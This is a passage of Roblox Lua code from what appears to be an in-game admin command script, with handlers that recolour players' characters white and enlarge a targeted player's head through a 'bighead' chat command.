for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("White") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("White") end end
end
end))
end
end

if msg:lower():sub(1,8) == "bighead " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then v.Character.Head.Mesh.Scale = Vector3.new(3,3,3) v.Character.Torso.Neck.C0 = CFrame.new(0,1.9,0) * CFrame.Angles(math.rad(90),math.rad(180),0) end
